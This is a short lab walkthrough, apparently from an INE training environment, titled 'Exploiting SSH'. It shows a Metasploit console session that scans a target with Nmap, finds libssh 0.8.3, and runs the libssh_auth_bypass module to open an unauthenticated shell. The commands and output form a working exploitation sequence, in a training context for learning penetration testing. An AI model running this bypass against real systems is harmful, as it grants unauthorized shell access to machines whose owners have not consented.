# Exploiting SSH

```bash
# Start Metasploit
msf6 > setg RHOSTS 192.153.41.3
RHOSTS => 192.153.41.3
msf6 > setg RHOST 192.153.41.3
RHOST => 192.153.41.3

# Nmap
msf6 > db_nmap -sS -sV -O 192.153.41.3
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-24 09:55 IST
[*] Nmap: Nmap scan report for demo.ine.local (192.153.41.3)
[*] Nmap: Host is up (0.000053s latency).
[*] Nmap: Not shown: 999 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
[*] Nmap: MAC Address: 02:42:C0:99:29:03 (Unknown)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.8

msf6 > search libssh_auth_bypass
msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > 
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set SPAWN_PTY true
SPAWN_PTY => true

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 192.153.41.3:22 - Attempting authentication bypass
[*] Attempting "Shell" Action, see "show actions" for more details
[*] Command shell session 2 opened (192.153.41.2:42015 -> 192.153.41.3:22) at 2025-07-24 09:59:06 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


# SSH session created
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions

Active sessions
===============

  Id  Name  Type   Information                Connection
  --  ----  ----   -----------                ----------
  2         shell  libssh Authentication Byp  192.153.41.2:42015 -> 192.
                   ass Scanner (SSH-2.0-libs  153.41.3:22 (192.153.41.3)
                   sh_0.8.3)
```

